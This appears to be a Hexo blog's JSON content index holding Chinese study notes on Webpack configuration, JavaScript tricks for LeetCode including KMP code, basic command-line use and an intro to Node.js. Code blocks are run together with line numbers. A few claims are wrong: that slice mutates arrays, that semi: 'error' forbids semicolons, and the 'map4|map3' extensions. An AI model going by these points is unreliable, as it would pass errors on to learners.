{"meta":{"title":"一之碎片","subtitle":"「宠辱不惊 相由心生」","description":"前端 杂谈","author":"一之碎片","url":"https://avalooooooon.github.io","root":"/"},"pages":[{"title":"about","date":"2022-08-31T06:14:02.000Z","updated":"2022-08-31T06:14:02.130Z","comments":true,"path":"about/index.html","permalink":"https://avalooooooon.github.io/about/","excerpt":"","text":""}],"posts":[{"title":"Webpack教程","slug":"Webpack教程","date":"2022-10-13T04:56:02.000Z","updated":"2022-10-13T04:56:02.000Z","comments":true,"path":"2022/10/13/Webpack教程/","link":"","permalink":"https://avalooooooon.github.io/2022/10/13/Webpack%E6%95%99%E7%A8%8B/","excerpt":"","text":"Webpack是一个静态资源打包工具。以一个或多个文件作为打包的入口，将我们整个项目所有文件编译组合成一个或多个文件输出出去。“打包”，就是编译，把浏览器不识别的语法编译成可以识别的语法。输出的文件就是编译好的文件，就可以在浏览器段运行了。我们将这种 Webpack 输出的文件叫做 bundle。Webpack在线课件 Webpack作用开发时，我们会使用框架（React、Vue），ES6 模块化语法，Less&#x2F;Sass 等 css 预处理器等语法进行开发。这样的代码要想运行，必须经过编译，编译成浏览器能识别的 JS、Css 等语法，才能运行。所以我们需要打包工具帮我们把框架什么的语法编译成浏览器可以识别的语法，最终才能在浏览器中运行。打包工具还能压缩代码、做兼容性处理、提升代码性能等。除了最常用的Webpack外，比较常见的打包工具还有Grunt、Gulp、Parcel、Rollup、Vite等。 Webpack 本身是不能识别样式资源的，所以需要借助 Loader 来帮助 Webpack 解析样式资源。找 Loader 都应该去官方文档中找到对应的 Loader后使用。官方文档找不到的话，可以从社区 Github 中搜索查询。基本流程都是一样的，下载依赖-&gt;在webpack.config.js中配置，还有创建资源 ，同时要记得引入。Webpack 官方 Loader 文档 不过官网可能存在一个问题，在“快速开始”的第一步中，npm install --save-dev xxx中的xxx可能未完整包含所需要的依赖。所以在我们使用的时候还需要观察官网在webpack.config.js中的module - rules - use字段中用了哪些loader，就去下载这些loader。或者根据npx webpack后的报错里Can&#39;t resolve xxx，无脑 去下载这里提到的loader就行。 想要webpack打包资源，必须得在入口文件中引入该资源。所以，想要处理什么资源，就要先创建这个资源，并且要在入口文件中import引入，它才会被打包。有些类型的文件，比如css，直接打包会报错，因为webpack不能处理这种资源。这时候就要去配置loader，让它可以处理这些资源。去官方文档下载依赖、进行依赖配置。 在index.html中引入打包后的js文件，才能看到效果。 运行指令npx webpack，打开 index.html 页面查看效果。 开始使用Webpack 本身功能是有限的，有两种模式:开发模式：仅能编译 JS 中的 ES Module 语法。在项目开发过程中使用的模式。生产模式：除能编译 JS 中的 ES Module 语法外，还能压缩 JS 代码。代码要部署上线时使用的模式。所以它本身能处理的文件只有JS文件，样式文件遇到就会报错，处理不了。所以需要学习Webpack的其他配置来让它的功能变得强大。 在项目根目录中，如果没有package.json，则需要执行npm init -y命令生成package.json并对其进行初始化。此时会生成一个基础的package.json文件。执行npm i webpack webpack-cli -D下载依赖（这里的-D是把依赖安装到开发依赖的意思）。 执行npx webpack ./src/main.js --mode=development开始打包，该命令指定环境为开发环境。 命令npx webpack: 是用来运行本地安装 Webpack 包的。 命令./src/main.js: 指定 Webpack 从哪个文件作为入口开始打包。不但会打包入口文件main.js，还会将其依赖也一起打包进来。 命令--mode=xxx：指定模式（环境）。 打包完成后会生成一个dist目录，打包出来的文件会输出到这个文件夹中。打开main.js，可以发现webpack把一些ES6的语法编译成了__webpack_modules__、__webpack_exports__等变量。此外还可以发现，每一个.js文件资源都被一个eval()函数包起来了。 需要注意的是，在开发环境中webpack只能编译ES6的模块化语法，...和箭头函数等其他语法并不能编译。 编译完成后，把入口文件index.html中引入的src中的main.js换成dist文件夹中的main.js再运行，打开控制台，会发现没有报错了。（直接运行src中的main.js，会报错：Cannot use import statement outside a module，因为导入文件模块是es6模块化语法，而浏览器并不支持es6语法。） 上面的例子是在开发环境下进行编译。如果在生产环境中进行打包，指令变为npx webpack ./src/main.js --mode=production。此时webpack也会把结果输出到dist文件夹中，但会进行压缩，生成非常简单的代码。 基本配置 5大核心概念如下： entry（入口）：指示 Webpack 从哪个文件开始打包。Webpack 会以一个或多个文件作为入口。 entry里的路径需要用相对路径。 output（输出）：指示 Webpack 打包完的文件输出到哪里去，如何命名等。如果不指定也会有一个默认值，但不推荐，因为将来大概率需要对打包后的文件进行一些操作。 注意需要指定输出的两个细节：path和filename。 分别是输出路径和输出名称。 output里的路径需要用绝对路径。需要用到node.js的核心模块：path，该模块专门用来处理路径问题。使用path模块的一个方法：path.resolve()，该方法返回一个绝对路径。__dirname变量是node环境下的一个变量，表示当前文件所在的文件夹的路径，可以直接使用。 loader（加载器）：webpack 本身只能处理 js、json 等资源，样式、图片等其他资源需要借助 loader，Webpack 才能解析。 在webpack.config.js中加载器的名字叫module，里面写着rules。rules是一个数组，其内部要写的是loader的规则。 plugins（插件）：扩展 Webpack 的功能。是一个数组。 mode（模式）：主要由两种模式：开发模式development；生产模式production。 开发模式主要在开发过程中使用，代码能运行即可。这个模式下我们主要做两件事： 编译代码，使浏览器能识别运行：webpack 本来只能处理js资源，然而开发时还有样式资源、字体图标、图片资源、html 资源等，webpack 默认都不能处理这些资源，所以要加载配置来编译这些资源。 代码质量检查，树立代码规范：可以借助一些工具，如ESLint，提前检查代码的一些隐患。提前检查代码规范和格式，统一团队编码风格，让代码更优雅美观。 而生产模式就需要对代码进行各种优化。 配置文件配置文件：webpack.config.js一定位于项目的根目录下！由于Webpack 是基于 Node.js 运行的，所以采用 Common.js 模块化规范：module.exports = &#123;&#125;。基本格式如下： 12345678910111213141516171819202122const path = require(&quot;path&quot;) // nodejs核心模块module.exports = &#123; // 入口。注意是相对路径。 entry: &quot;./src/main.js&quot;, // 输出。注意是绝对路径。 output: &#123; path: path.resolve(__dirname, &quot;dist&quot;), filename: &#x27;main.js&#x27; &#125;, // 加载器 module: &#123; rules: [ // loader的配置 ], &#125;, // 插件 plugins: [ // plugin的配置 ], // 模式 mode: &quot;development&quot;, // 此处指定的是开发环境。&#125;; 写好配置文件后，在控制台运行webpack。命令由npx webpack ./src/main.js --mode=development变成了npx webpack。 webpack```命令会去当前运行所在的目录中找```webpack.config.js```文件，读取里面的配置，按照里面的配置执行相应的打包操作。12345678910111213141516171819202122232425262728293031323334类似```npx webpack ./src/main.js --mode=development```，如果在```npx webpack```后面加了指令，则会按加的指令执行相应的操作。总之就是，如果有配置文件，就```npx webpack```；没配置文件就手动加指令，用```npx webpack ./src/main.js --mode=development```。## 处理CSS资源1. 下载CSS Loader及其它处理CSS需要用到的loader：```npm i css-loader style-loader -D```。这里具体下载哪几个需要去官网查看其配置文件中module - rules - use都有什么。 - css-loader：先执行。将css资源编译成commonjs的模块到js中，即负责将 Css 文件编译成 Webpack 能识别的模块。 - style-loader：在css-loader后执行。会动态创建一个 Style 标签，里面放置 Webpack 中 Css 模块内容。需要先把css打包到js中。 下载好后样式就会以 Style 标签的形式在页面上生效。2. 在配置文件中的配置如下：```javascriptconst path = require(&quot;path&quot;) // nodejs核心模块module.exports = &#123; entry: &quot;./src/main.js&quot;, // 入口。注意是相对路径。 output: &#123; path: path.resolve(__dirname, &quot;dist&quot;), // 输出。注意是绝对路径。 filename: &#x27;main.js&#x27; &#125;, // 加载器 module: &#123; rules: [ // loader的配置。test里面是想要这个loader对那些文件生效。 &#123; test: /\\.css$/, // 只检测.css文件，并对其使用下面的规则 use: [ // 使用什么loader去处理。执行顺序是从后到前。 &quot;style-loader&quot;, // 通过动态创建style标签使样式生效。 &quot;css-loader&quot;, // 把css打包到js中。 ], &#125;, ], &#125;, plugins: [], mode: &quot;development&quot;, // 此处指定的是开发环境。&#125;; 注意官方文档中是test: /\\.css$/i。正则的i是修饰符，意思是不区分大小写，也就是你的文件是LESS还是less都能匹配上。但是不写i就要求一定得是less。此外，官方文档的配置有的将use写为了loader。它们的区别是loader:&#39;xxx&#39;只能使用一个loader。可能需要我们自行将其修改为use。3. 添加好CSS资源，并在入口文件main.js引入 Css 资源，Webpack才会对其打包。在index.html中引入打包后的js文件../dist/main.js，才能看到效果。4. 运行指令npx webpack，打开 index.html 页面查看效果。 处理Less资源less是css的一个预处理器，是 CSS 上的一种抽象层。 Less 是一种动态样式语言，将 CSS 赋予了动态语言的特性，如混合语法、变量，继承，运算， 函数，LESS 既可以在客户端上运行 (支持 IE 6+, Webkit, Firefox)，也可以在服务端运行 (借助 Node.js)。 less-loader：将less编译成css文件。 处理Sass、Scss、Styl资源类似less。 处理图片资源过去在 Webpack4 时，我们处理图片资源通过 file-loader 和 url-loader 进行处理： file-loader：将文件资源原封不动的输出出去，在过程中会将它编译成webpack能识别的资源 url-loader：在file-loader的基础上，将小于某个大小的文件转化成base64，对图片资源做了一些优化。现在 Webpack5 已经将两个 Loader 功能内置到 Webpack 里了，我们只需要简单配置即可处理图片资源。处理图片并不需要下载什么loader。 在webpack.config.js添加配置： 1234&#123; test: /\\.(png|jpe?g|gif|webp)$/, type: &quot;asset&quot;,&#125;, 这里的type: &quot;asset&quot;即相当于使用了url-loader，能够帮助我们对图片进行处理。 各项配置好后再运行npx webpack，打开 index.html 页面查看输出资源情况，此时如果查看 dist 目录的话，会发现多了几张图片资源，也就是我们之前放到images文件夹然后引入了的几张图片，因为 Webpack 会将所有打包好的资源输出到 dist 目录下。但为什么样式资源没有呢？因为经过 style-loader 的处理，样式资源打包到 main.js 里面去了，所以没有额外输出出来。 对图片资源进行优化比如将小于某个大小的图片转化成 data URI 形式（Base64 格式）。 将图片转化为Base64 格式（DataUrl）的优势是会直接渲染图片，减少图片的请求数量，从而降低服务器压力。图片转化为Base64 后体积会变大。图片原体积越大，转换成Base64后增加的体积越多，所以一般只会对小图片（5kb）进行这种处理。 在官方文档中搜索“asset”， 进入资源模块。可以看到很多种asset资源模块类型的多种形式。在通用资源类型中找到base64处理的相关配置，将其添加到处理图片原有的配置项里。如下： 123456789&#123; test: /\\.(png|jpe?g|gif|webp)$/, type: &quot;asset&quot;, parser: &#123; // 添加的配置项 dataUrlCondition: &#123; maxSize: 10 * 1024 // 小于10kb的图片会被base64处理 &#125; &#125;&#125;, 配置完成后，就可以在打包时看到结果。注意他不会删除已经打包输出的文件，所以需要将上次打包生成的文件清空，再重新打包才有效果。 修改输出资源的名称和路径到目前为止，可以看到所有打包好的资源都是同级的放在dist文件中，不利于很好的按js、img、css等文件类型整理文件。在webpack.config.js文件中，output中的path——path: path.resolve(__dirname, &quot;dist&quot;)，是所有文件的输出目录，所有打包的文件都在这；而filename——filename: &#39;main.js&#39;是入口文件打包输出的文件名，只有入口文件打包出来放在这个目录。正确的修改方式如下： 将 js 文件输出到 static&#x2F;js 目录中：filename: &quot;static/js/main.js&quot; 将图片文件输出到 static&#x2F;imgs 目录中，在官方文档中搜索“asset”，找到“自定义输出文件名”，将generator配置项添加到图片资源的配置项中，也就是与图片配置项中的test、type、parser同级的位置。在dist文件夹中可以看到图片会有一个id，这个id对于webpack是一个哈希值，是唯一的：1234567generator: &#123; // 将图片文件命名 [hash:8][ext][query] // [hash:8]: hash值取8位 // [ext]: 使用之前的文件扩展名 // [query]: 添加之前的query参数 filename: &quot;static/imgs/[hash:8][ext][query]&quot;,&#125;, 自动清空上次打包资源只需在webpack.config.js文件中，output配置项中添加配置clean: true即可。作用就是在打包前把path文件夹整个清空再打包。 12345output: &#123; path: path.resolve(__dirname, &quot;dist&quot;), filename: &quot;static/js/main.js&quot;, clean: true, // 自动将上次打包目录资源清空&#125;, 处理字体图标资源图标的三种使用方法：Unicode、Font class、Symbol。Font class用法简单，最常用。先下载字体图标文件，再在自己的项目中添加字体图标资源并引入（注意字体文件路径需要修改）。比如使用阿里巴巴矢量图标库，需要添加的资源就有src/fonts/iconfont.ttf、src/fonts/iconfont.woff、src/fonts/iconfont.woff2、src/css/iconfont.css。在webpack配置文件中的配置类似图片，依然是在generator中国呢改变输出名称。如下： 1234567&#123; test: /\\.(ttf|woff2?)$/, type: &quot;asset/resource&quot;, generator: &#123; filename: &quot;static/media/[hash:8][ext][query]&quot;, &#125;,&#125;, 注意type: &quot;asset/resource&quot;和type: &quot;asset&quot;的区别： type: &quot;asset/resource&quot; 相当于file-loader, 只会将文件转化成 Webpack 能识别的资源，其他不做处理。我们的字体文件不需要进行base64的转换，所以用这个。 type: &quot;asset&quot; 相当于url-loader, 将文件转化成 Webpack 能识别的资源，同时小于某个大小的资源会处理成 data URI 形式 处理音视频等其它资源在处理字体图标资源基础上增加其他文件类型，统一处理即可。 1234567&#123; test: /\\.(ttf|woff2?|map4|map3|avi)$/, type: &quot;asset/resource&quot;, generator: &#123; filename: &quot;static/media/[hash:8][ext][query]&quot;, &#125;,&#125; 处理js资源js 资源 Webpack 不能已经处理了吗，为什么还要处理呢？首先Webpack 对 js 处理是有限的，只能编译 js 中 ES 模块化语法，不能编译其他语法，导致 js 不能在 IE 等浏览器运行，因为ie不认识任何ES6语法，所以我们希望做一些兼容性处理；其次开发中，团队对代码格式是有严格要求的，我们不能由肉眼去检测代码格式，需要使用专业的工具来检测。 针对 js 兼容性处理，我们使用 Babel 来完成；针对代码格式，我们使用 Eslint 来完成 我们先完成 Eslint，检测代码格式无误后，在由 Babel 做代码兼容性处理 Eslint可组装的 JavaScript 和 JSX （react的语法就是JSX）检查工具。也就是说它是用来检测 js 和 jsx 语法的工具，可以配置各项功能。 原生支持react；要想支持vue，需要安点别的插件。 使用 Eslint关键是写 Eslint 配置文件，里面写上各种 rules 规则，将来运行 Eslint 时就会以写的规则对代码进行检查。 配置文件有很多种写法： .eslintrc.*：新建文件，位于项目根目录。这几个的区别在于配置格式不一样。 .eslintrc .eslintrc.js .eslintrc.json 在package.json 中配置eslintConfig：不需要创建文件，在原有文件基础上写。 ESLint 会查找和自动读取它们，所以以上配置文件只需要存在一个即可。下面以.eslintrc.js为例： 12345678910module.exports = &#123; // 解析选项 parserOptions: &#123;&#125;, // 具体检查规则 rules: &#123;&#125;, // 继承其他规则 extends: [], // ... // 其他规则详见：https://eslint.bootcss.com/docs/user-guide/configuring&#125;; parserOptions 解析选项。是1234567parserOptions: &#123; ecmaVersion: 6, // ES 语法版本 sourceType: &quot;module&quot;, // ES 模块化 ecmaFeatures: &#123; // ES 其他特性 jsx: true // 如果是 React 项目，就需要开启 jsx 语法 &#125;&#125; rules 具体规则 “off” 或 0 ：关闭规则 “warn” 或 1：开启规则，使用警告级别的错误：warn (不会导致程序退出) “error” 或 2：开启规则，使用错误级别的错误：error (当被触发的时候，程序会退出)123456789101112rules: &#123; semi: &quot;error&quot;, // 禁止使用分号 &#x27;array-callback-return&#x27;: &#x27;warn&#x27;, // 强制数组方法的回调函数中有 return 语句，否则警告 &#x27;default-case&#x27;: [ &#x27;warn&#x27;, // 要求 switch 语句中有 default 分支，否则警告 &#123; commentPattern: &#x27;^no default$&#x27; &#125; // 允许在最后注释 no default, 就不会有警告了 ], eqeqeq: [ &#x27;warn&#x27;, // 强制使用 === 和 !==，否则警告 &#x27;smart&#x27; // https://eslint.bootcss.com/docs/rules/eqeqeq#smart 除了少数情况下不会有警告 ],&#125; 更多规则详见：规则文档 extends 继承开发中一点点写 rules 规则太费劲了，所以有更好的办法，继承现有的规则。现有以下较为有名的规则： Eslint 官方的规则：eslint:recommended Vue Cli 官方的规则：plugin:vue&#x2F;essential React Cli 官方的规则：react-app123456789// 例如在React项目中，我们可以这样写配置module.exports = &#123; extends: [&quot;react-app&quot;], rules: &#123; // 我们的规则会覆盖掉react-app的规则 // 所以想要修改规则直接改就是了 eqeqeq: [&quot;warn&quot;, &quot;smart&quot;], &#125;,&#125;; 要在webpack中使用，首先还是下载包：&#96;&#96;&#96; BabelJavaScript 编译器。主要用于将 ES6 语法编写的代码转换为向后兼容的 JavaScript 语法，以便能够运行在当前和旧版本的浏览器或其他环境中。","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Webpack","slug":"前端/Webpack","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/Webpack/"}],"tags":[{"name":"Webpack","slug":"Webpack","permalink":"https://avalooooooon.github.io/tags/Webpack/"}]},{"title":"leetcode刷题常用技巧","slug":"leetcode刷题常用技巧","date":"2022-09-27T03:42:15.000Z","updated":"2022-09-27T03:42:15.000Z","comments":true,"path":"2022/09/27/leetcode刷题常用技巧/","link":"","permalink":"https://avalooooooon.github.io/2022/09/27/leetcode%E5%88%B7%E9%A2%98%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/","excerpt":"","text":"编程语言为js。 数值操作取整 截取整数+强制类型转换：parseInt(a)。将一个字符串中的 有效 整数拿出。可以用来取整。依次将字符串中从左到右的数字部分转为整数,一旦转换失败，返回NaN。正数向下取整，负数向上。可以接收第二个参数，为进制数。 移位运算符：&gt;&gt;或&lt;&lt;。以&gt;&gt;为例，(right - left) &gt;&gt; 1以为在二进制下右移一位并取整。正数向下取整。 防止溢出 用mid = left + ((right - left) / 2)代替mid = (left + right) / 2)。 常用常量 js的最大安全整数：Number.MAX_SAFE_INTEGER。 其它类型转换为Number字符操作编码转换 转换为Unicode：stringObject.charCodeAt([index])，返回字符串中特定位置的字符的Unicode值。如果不提供index参数，则 charCodeAt() 方法将使用 0 作为默认值。 数组方法一种方法可以有很多种使用方式，这里只列出最常用的。数组使用扩展运算符foo = &#123; ...[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;] &#125;后的结果为&#123;0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;&#125;。如果扩展运算符后面是字符串，它会自动转成一个类似数组的对象。通过new Array(n).fill(value)等方法进行初始化。 删除元素 方法array.splice(index,num)：删除指定位置的元素，第一个参数为要删除第一项的位置，第二个参数为要删除的项数。返回值为删除内容，array为结果值。改变原数组。 方法array.shift()：删除数组的第一个元素。返回值为第一个元素的值。改变原数组。 增加元素 方法array.fill(value, start, end)：将一个固定值替换数组的元素。后两个参数可选，不写的话默认给整个数组填充。 方法array.push(item1, item2, ..., itemX)：添加元素到末尾。改变原数组。 方法array.unshift(item1, item2, ..., itemX)：添加元素到开头。改变原数组。 方法Array.concat(arr2,arr3,num)：将数组或值添加到结尾。不改变原数组。 使用扩展运算符...，如arr2 = [...arr1,4,5,6]：将一个数组（和其他元素）插入到另一个数组中。 查找元素 方法array.includes(&#39;a&#39;)：判断数组是否包含某元素，返回true 或者false。 遍历元素使用for(xxx of xxx)遍历数组。 尽量不要使用for in遍历数组！原因如下：for in的index索引为字符串型数字，不能直接进行几何运算；遍历顺序有可能不是按照实际数组的内部顺序；使用for in会遍历数组所有的可枚举属性，包括原型。for in更适合遍历对象。 方法array.reduce(function(prev,cur,index,arr)&#123;...&#125;,init)：对数组每个元素逐个执行一个reduce函数，返回值为结果。循环遍历能做的，reduce都可以做，比如数组求和、数组求积、数组中元素出现的次数、数组去重等等。 prev：必需。累计器累计回调的返回值; 表示上一次调用回调时的返回值，或者初始值 initcur：必需。表示当前正在处理的数组元素index可选，表示当前正在处理的数组元素的索引，若提供 init 值，则起始索引为- 0，否则起始索引为1；arr可选，表示原数组；init可选，表示初始值。 提取指定位置的元素 方法array.alice(start,end)：返回值为下标[start，end)位置上的新数组。改变原数组。注意包括start，但不包括end。数组与其他数据类型互相转化 方法Array.from()：从一个类似数组或可迭代对象创建一个新的，浅拷贝的数组实例。 方法str.split(&quot; &quot;)：字符串转数组。可以传一个参数作为切割标志，不传则默认切割每一个字符。 方法str.join(&quot;&quot;)：数组转字符串。 方法xxx.toString()或a = String(a)：数值转对应进制的数字字符串。 map方法 关键词：key个数不确定；哈希值比较少、特别分散、跨度非常大（此时使用数组作为哈希表会产生很大浪费）； 通过new Map()等方法进行初始化。可以通过map[key]获得value。 查看key的value值&#x2F;key是否存在：map.set(tchar, map.has(tchar) ? map.get(tchar) + 1 : 1)。 遍历操作 forEach遍历：第一个参数是属性值，第二个参数是属性123map.forEach(function(value,key)&#123; console.log(value,key);&#125;) for-of遍历123456for(let item of map)&#123; //遍历结果是数组，数组的每一项都是长为2的数组[key,value]&#125;for(let item of map.values())&#123; //遍历属性值&#125; for(let item of map.keys())&#123; //遍历属性&#125; entries遍历12for(let item of map.entries())&#123; //遍历结果同forEach&#125; 字符串方法遍历操作 方法for(const i of str)：遍历。 链表注意———需要操作的节点是头节点时如何处理；链表结尾的判定：currnode.next !== null；链表中只有一个元素时如何处理；涉及到不容易想清楚的位置变换时记得画图，否则指针一多很容易乱。使用js时，单链表可以如下定义： 1234function ListNode(val, next) &#123; this.val = (val===undefined ? 0 : val) this.next = (next===undefined ? null : next)&#125; 初始化： 1234567891011class Node &#123; constructor(val, next) &#123; this.val = val this.next = next &#125;&#125;var MyLinkedList = function () &#123; this._size = 0 this._head = null this._tail = null&#125;; 虚拟头节点dummyhead常定义一个指向真正头节点的虚拟头节点：var dummyhead = new ListNode(0,head);dummyhead.next = head。 环形链表常涉及到数学运算，如判断是否有环和环入口时。必要时可以考虑将环形链表展开为直线再运算。常用方法：快慢双指针。根据是否相遇、何时相遇进行判断。 算法二分查找 关键字：有序数组、无重复元素、复杂度O(logn) 注意区间开闭。 双指针 关键字：数组&#x2F;链表&#x2F;字符串、不占用额外空间、保持相对顺序、复杂度O(n)反转问题、反转链表等，判断链表是否有环时也使用了快慢两个指针。很多数组填充类的问题也可以用双指针。预先给数组扩容带填充后的大小，然后在从后向前进行操作。N数之和：通过前后两个指针不算向中间逼近，在一个for循环下完成两个for循环的工作。N变大，则在三数之和的基础上再套一层for循环，依然是使用双指针法。 通过两个指针在一个for循环下完成两个for循环的工作。必须明确快慢指针各自的具体含义。比如快指针是在遍历中寻找满足条件的元素，慢指针是指向结果数组中存放满足条件的元素的下标（位置）。 滑动窗口 双指针的一种关键字：不占用额外空间、保持相对顺序、复杂度O(n) 明确：是以滑动窗口的起始位置还是终止位置为for循环的标识。 哈希表使用哈希法的标志：查询一个元素是否出现过、一个元素是否在集合里。 数组 关键字：题目都限制了数值的大小，key个数确定（如26个英文字母）；复杂度O(n) const resSet = new Array(26).fill(0); 缺点：数组大小有限，受到系统栈空间（不是数据结构的栈）的限制；如果数组空间够大但哈希值比较少、特别分散、跨度非常大，数组就会造成空间的极大浪费。 Map 关键词：key个数不确定；除了知道是否出现，还需要知道出现位置等其他信息（存在value里）；哈希值比较少、特别分散、跨度非常大；特殊：无限循环（快乐数）可以说是万能的哈希结构。但也存在更适合用Set或者数组的情况。 缺点： 占用空间比数组大，速度比数组慢 SetSet中的数只会出现一次。 关键词：只需要知道key值是否重复出现；快速判断一个元素是否出现在集合里 缺点：set是一个集合，里面放的元素只能是一个key，而类似两数之和的题目，不仅要判断y是否存在而且还要记录y的下标位置，所以set 也不能用。 KMP字符串匹配算法之一。当出现字符串不匹配时，通过记录已经匹配的文本内容，利用这些信息避免从头再去做匹配。使用KMP算法，一定要构造next数组。 next数组本质是前缀表。当在某个字符出发现模式串与主串(文本串)不匹配的时候，它会告诉我们下一步匹配中** 模式串 应该跳到哪个位置。前缀表：长度等于模式串的长度，模式串与前缀表对应位置的数字的含义即为记录该下标i之前（包括i）的字符串中，相同前缀后缀的 长度 **。 前缀&#x2F;后缀字符串的前缀：所有以第一个字符开头的连续子串，但不包含最后一个字符。字符串的后缀：所有以最后一个字符结尾的连续子串，但不包含第一个字符。当匹配过程中遇到了失配字符，考虑模式串在失配字符前（不包括失配字符）的字符串；失配字符在后缀子串的后面，所以找到与其相同的前缀的后面从新匹配就可以了。也即，遇到了失配字符， 此时我们要看它的前一个字符的前缀表的数值是多少。此外，根据前缀表的定义，如果前一个字符的前缀表的数值是k， 可以直接把指针跳到模式串下标为k的位置继续比较。这里不需要进行额外的数学计算（比如用当前位置的下标减去k+1什么的）。 next数组与前缀表的两种关系第一种情况，next数组完全就是前缀表。第二种情况，把前缀表统一减一（右移一位，初始位置为-1）之后作为next数组。它们的差别只有具体实现上略微不同，而不涉及到KMP的原理。 next数组的构造getNext（前缀表的计算） 以下是next数组完全就是前缀表的写法。 初始化：定义两个指针i和j，j指向前缀末尾位置，i指向后缀末尾位置。同时进行初始化操作int j = 0;next[0] = 0;。遍历方法为 for(int i = 1; i &lt; s.size(); i++)。这里j在循环外，对应循环中的下标为i-1的元素所对应的next值(长度）；也是这个next值所对应的从字符串开始位置开始的前缀末尾的下一个位置的下标. 处理前后缀不相同的情况：向前回退。next[j]就是记录着j（包括j）之前的子串的相同前后缀的长度。那么 s[i] 与 s[j] 不相同，就要找 j前一个元素在next数组里的值（就是next[j-1]）。 处理前后缀相同的情况：如果 s[i] 与 s[j + ] 相同，那么就同时向后移动i和j 说明找到了相同的前后缀，同时还要将移动后j（前缀的长度）赋给next[i], 因为next[i]要记录相同前后缀的长度。 使用Next数组进行匹配 力扣 28.实现strStr 题目的整体代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * @param &#123;string&#125; haystack * @param &#123;string&#125; needle * @return &#123;number&#125; */var getNext = function (str) &#123; let next = [] let j = 0 // 这里j在循环外，对应循环中的下标为i-1的元素所对应的next值(长度）；也是这个next值所对应的从字符串开始位置开始的前缀末尾的下一个位置的下标. next.push(j) for (let i = 1; i &lt; str.length; i++) &#123; // 每次循环都有next.push(j)，这里相当于有：j = next[i-1]。 while (j &gt; 0 &amp;&amp; str[i] !== str[j]) &#123; j = next[j - 1] // j是结尾下标为i-1（长度i）的字符串的最长公共前后缀【长度】。j-1是这个最长公共前后缀的【结尾下标】。next[j-1]是结尾下标为j-1（长度j）的字符串的最长公共前后缀【长度】。注意上一行是【i】，这一行是【j】。 //所以再进入while时，str[j]就是上面注释提到的结尾下标为j-1（长度j）的字符串的最长公共前后缀【的下一个元素】。比较的逻辑和if是一样的了。同时注意j不能为0.（第一行中的最长公共前后缀长度如果为0，j都不用更新直接push进去就行） &#125; if (str[i] === str[j]) &#123; j += 1 &#125; next.push(j) &#125; return next&#125;var strStr = function (haystack, needle) &#123; if (needle == &#x27;&#x27;) &#123; return 0 &#125; var next = getNext(needle) var currlength = 0 for (let i = 0; i &lt; haystack.length; i++) &#123; while (currlength &gt; 0 &amp;&amp; haystack[i] != needle[currlength]) &#123; currlength = next[currlength - 1] &#125; if (haystack[i] == needle[currlength]) &#123; currlength++ &#125; if (currlength == needle.length) &#123; return (i - needle.length + 1) &#125; &#125; return -1&#125;; 反转系列 关键词：原地修改；不能申请额外空间，只能在本串上操作。常用方法：先整体反转再局部反转","categories":[{"name":"leetcode","slug":"leetcode","permalink":"https://avalooooooon.github.io/categories/leetcode/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"https://avalooooooon.github.io/tags/leetcode/"}]},{"title":"命令行及环境变量","slug":"命令行及环境变量","date":"2022-09-21T08:27:12.000Z","updated":"2022-09-21T08:27:12.000Z","comments":true,"path":"2022/09/21/命令行及环境变量/","link":"","permalink":"https://avalooooooon.github.io/2022/09/21/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%8A%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/","excerpt":"","text":"目录.： 表示当前目录，可以省略。(./style.css可以简写为style.css)..： 表示上一级目录 指令cd 目录名：进入指定目录dir：（win）列出当前目录下的所有文件ls：（mac）同上md 目录名：（win）在当前目录创建一个指定名字的文件夹mkdir 目录名：（mac&#x2F;Linux ）同上rd 目录名：（win）删除一个指定名字的文件夹（不经过回收站）rm 目录名：（mac&#x2F;Linux ）同上 环境变量（win）控制面板-&gt;高级系统设置-&gt;高级-&gt;环境变量。系统变量不同于用户变量的地方是，系统变量所有用户都可以用，而用户变量只有当前用户可以用。一般修改用户变量。 改完环境变量后需要重启命令行窗口。 path放的是一个个以分号结尾的路径。当我们在命令行窗口打开一个文件或调用一个程序时，系统会首先在当前目录下寻找文件程序。找到则直接打开；没找到则会依次到环境变量path的路径中寻找。一直没找到则报错。所以可以将一些经常需要访问的程序和文件的路径添加到path中，就可以在任意位置访问这些程序和文件了。","categories":[{"name":"shell","slug":"shell","permalink":"https://avalooooooon.github.io/categories/shell/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://avalooooooon.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"shell","slug":"shell","permalink":"https://avalooooooon.github.io/tags/shell/"}]},{"title":"node.js教程","slug":"node.js教程","date":"2022-09-21T08:23:17.000Z","updated":"2022-09-21T08:23:17.000Z","comments":true,"path":"2022/09/21/node.js教程/","link":"","permalink":"https://avalooooooon.github.io/2022/09/21/node.js%E6%95%99%E7%A8%8B/","excerpt":"","text":"简介Node.js是一个能够在服务器端运行JS的开放源代码的跨平台的JS运行环境。它基于谷歌的V8引擎，使用事件驱动、非阻塞和异步I&#x2F;O模型等技术来提高性能，可优化应用程序的传输量和规模。在nodejs出现之前，JS通常作为客户端程序设计语言使用，以JS写出的程序常在用户的浏览器上运行。 传统服务器一般都是多线程，每进来一个请求就会创建一个线程。 但服务器返回响应之前需要先和数据库交互，涉及到磁盘相关的I&#x2F;O处理，但I&#x2F;O处理速度有瓶颈难以提升，所以可能会有很多线程在服务器进行等待，即I&#x2F;O操作阻塞了线程的执行。此时这些线程虽然不干活，但也占用了服务器的内存。 node的服务器是单线程的。不过Node处理请求时是单线程，但是在后台拥有一个I&#x2F;O线程池。 对于nodejs，单线程是它的一大特点，即所有请求都只有一个线程，也不太会出现I&#x2F;O阻塞。但单线程也使得它无法处理访问量太大的应用（那种一般用JAVA)；所以它的主要用处就是web服务器。比如某宝，客户端需要和用java开发的服务器交互，而java的优势在于处理请求很快，但渲染页面慢；js恰好有页面渲染快的优点。所以可以在上图的客户端和服务器中间来一层node服务器，这个服务器专门用来渲染页面。 安装成功后，在终端输入node回车即可进入node环境（win需要配置环境变量）。输入node 